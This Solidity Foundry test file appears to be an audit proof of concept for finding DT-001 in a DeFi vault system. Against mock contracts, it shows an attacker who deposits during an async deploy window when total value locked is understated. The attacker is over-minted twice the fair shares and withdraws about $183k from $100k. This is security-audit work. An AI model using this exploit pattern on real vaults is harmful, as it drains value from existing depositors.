// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {ERC1967Proxy} from "openzeppelin-contracts/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {UpgradeableBeacon} from "openzeppelin-contracts/contracts/proxy/beacon/UpgradeableBeacon.sol";
import {CarthaVaultFactory} from "../../src/CarthaVaultFactory.sol";
import {CarthaVault} from "../../src/CarthaVault.sol";
import {CarthaParentVault} from "../../src/CarthaParentVault.sol";
import {Diamond} from "../../src/diamond/Diamond.sol";
import {MockERC20} from "../mocks/MockERC20.sol";
import {MockExchangeRouter} from "../mocks/MockExchangeRouter.sol";
import {Mock0xMReader} from "../mocks/Mock0xMReader.sol";
import {Mock0xMOracle} from "../mocks/Mock0xMOracle.sol";
import {I0xMReader} from "../../src/interfaces/I0xMReader.sol";
import {DiamondTestUtils} from "../utils/DiamondTestUtils.sol";
import {ICarthaVaultFactory} from "../../src/interfaces/ICarthaVaultFactory.sol";
import {ICarthaVault} from "../../src/interfaces/ICarthaVault.sol";
import {ICarthaAccessControl} from "../../src/interfaces/ICarthaAccessControl.sol";
import {Roles} from "../../src/diamond/Roles.sol";

/**
 * @title PoC — DT-001 : Share dilution via the async 0xM deploy window (in-flight value uncounted)
 * @notice Re-verifies that deployToPool() sends USDC to the 0xM depositVault immediately while GM is
 *         only minted later by the 0xM keeper (a separate tx), so during that window
 *         _totalValueLocked() is understated by the in-flight amount and _convertToShares OVER-MINTS to
 *         anyone depositing in the window — extracting value from existing holders.
 *
 * @dev ISOLATION FROM CARTHA-SEAM-001: this test uses the mock at its default 1:1 GM mint with a
 *      1e30 reader price, under which gmValueInUsdc returns the CORRECT USDC value (no decimal bug).
 *      The dilution below therefore comes purely from the in-flight accounting gap and survives even if
 *      the decimal mismatch is fixed.
 */
contract PoC_AsyncWindowDilution is Test {
    CarthaVaultFactory factory;
    ICarthaVault vault;
    MockERC20 usdc;
    MockERC20 gmToken;
    MockExchangeRouter exchangeRouter;
    Mock0xMReader reader;
    Mock0xMOracle oracle;
    Diamond diamond;
    ICarthaAccessControl accessControl;

    address admin = address(0x1);
    address keeperBot = address(0x5);
    address incumbent = address(0x1001); // existing LP, deposits before the window
    address attacker = address(0x1002); // deposits DURING the window
    address control = address(0x1003); // deposits AFTER settle (fair-price reference)

    bytes32 poolId = keccak256("BTC/USD");
    uint64 constant LOCK_DAYS = 30;

    function setUp() public {
        vm.startPrank(admin);
        (diamond, accessControl) = DiamondTestUtils.deployDiamond(admin);
        accessControl.grantRole(Roles.FACTORY, admin);
        accessControl.grantRole(Roles.KEEPER_BOT, keeperBot);

        CarthaVault vaultImpl = new CarthaVault();
        UpgradeableBeacon childBeacon = new UpgradeableBeacon(address(vaultImpl), admin);
        CarthaParentVault parentVaultImpl = new CarthaParentVault();
        UpgradeableBeacon parentBeacon = new UpgradeableBeacon(address(parentVaultImpl), admin);
        CarthaVaultFactory factoryImpl = new CarthaVaultFactory();
        bytes memory init = abi.encodeWithSelector(
            CarthaVaultFactory.initialize.selector, address(childBeacon), address(parentBeacon), address(diamond)
        );
        factory = CarthaVaultFactory(address(new ERC1967Proxy(address(factoryImpl), init)));

        usdc = new MockERC20("USD Coin", "USDC", 6);
        gmToken = new MockERC20("GM BTC/USD", "GM", 18);
        exchangeRouter = new MockExchangeRouter(address(gmToken));
        reader = new Mock0xMReader();
        oracle = new Mock0xMOracle();

        address vaultAddr = factory.deployVault(
            ICarthaVaultFactory.VaultConfig({asset: address(usdc), poolId: poolId, name: "cv", symbol: "cv"})
        );
        vault = ICarthaVault(vaultAddr);

        vault.setPoolToken(address(gmToken));
        vault.setMarketToken(address(gmToken));
        vault.setExchangeRouter(address(exchangeRouter));
        vault.setDepositVault(address(gmToken));
        vault.setWithdrawalVault(address(gmToken));
        CarthaVault(address(vault)).setReader(address(reader));
        CarthaVault(address(vault)).setDataStore(address(0xDA7A));
        CarthaVault(address(vault)).setOracle(address(oracle));
        reader.setMarket(
            I0xMReader.MarketProps({
                marketToken: address(gmToken),
                indexToken: address(0xB7C),
                longToken: address(usdc),
                shortToken: address(usdc)
            })
        );
        reader.setMarketTokenPrice(int256(1e30)); // with default 1:1 mint => GM valued correctly
        oracle.setPrice(address(0xB7C), 1e30, 1e30);
        oracle.setPrice(address(usdc), 1e30, 1e30);
        vm.stopPrank();
    }

    function _deposit(address u, uint256 amt) internal returns (uint256 shares) {
        usdc.mint(u, amt);
        vm.startPrank(u);
        usdc.approve(address(vault), amt);
        vault.depositAndLock(poolId, amt, LOCK_DAYS);
        vm.stopPrank();
        return CarthaVault(address(vault)).balanceOf(u);
    }

    function test_AsyncWindow_OverMintsAndExtractsValue() public {
        // 1) Incumbent LP seeds the vault with $1,000,000.
        _deposit(incumbent, 1_000_000e6);
        assertEq(vault.totalValueLocked(), 1_000_000e6, "TVL = $1M (all idle)");
        // Fair shares for a $100k deposit at the pre-window price (TVL $1M / supply).
        uint256 supplyBefore = CarthaVault(address(vault)).totalSupply();
        uint256 fairShares = 100_000e6 * supplyBefore / vault.totalValueLocked();

        // 2) Keeper opens the async window: deployToPool sends 50% to 0xM but does NOT execute yet.
        //    (executeDeposit is the SEPARATE 0xM-keeper tx that mints GM in a later block.)
        vm.prank(keeperBot);
        bytes32 pendingKey = vault.deployToPool(500_000e6, 0);
        // ---- window is now OPEN: USDC left the vault, GM not yet minted ----
        uint256 tvlInWindow = vault.totalValueLocked();
        assertEq(tvlInWindow, 500_000e6, "BUG: TVL understated to $500k while $500k is in-flight (true value still $1M)");

        // 3) Attacker deposits $100k DURING the window -> over-minted because TVL is understated 2x.
        uint256 attackerShares = _deposit(attacker, 100_000e6);

        // 4) The 0xM keeper now executes the pending deposit -> GM minted, TVL restored.
        exchangeRouter.executeDeposit(pendingKey, address(usdc));

        // 5) Control deposits the SAME $100k AFTER settle (fair price).
        uint256 controlShares = _deposit(control, 100_000e6);

        // PROOF 1 — the window depositor was over-minted EXACTLY 2x the fair amount (50% deploy =>
        //           TVL halved => 1/(1-0.5) = 2x), and more than a fair post-settle control.
        assertEq(attackerShares, 2 * fairShares, "exactly 2x over-mint vs the pre-window fair price");
        assertGt(attackerShares, controlShares, "window depositor minted MORE shares than the fair control");
        console2.log("fair shares for $100k       :", fairShares);
        console2.log("attacker shares (in-window) :", attackerShares);
        console2.log("control  shares (post-settle):", controlShares);

        // 6) Realise it: warp past lock+cooldown, attacker releases -> withdraws MORE than deposited.
        vm.warp(block.timestamp + uint256(LOCK_DAYS) * 1 days + 7 days + 1);
        vm.prank(attacker);
        vault.release(poolId, 100_000e6);
        uint256 attackerOut = usdc.balanceOf(attacker);

        // PROOF 2 — profit at the incumbent's expense (deposited $100k, withdrew materially more).
        assertGt(attackerOut, 100_000e6, "attacker profits vs their own deposit");
        assertGt(attackerOut, 150_000e6, "attacker extracts ~$183k from a $100k deposit (50% window)");
        console2.log("attacker deposited (USDC):", uint256(100_000e6));
        console2.log("attacker withdrew  (USDC):", attackerOut);
    }
}
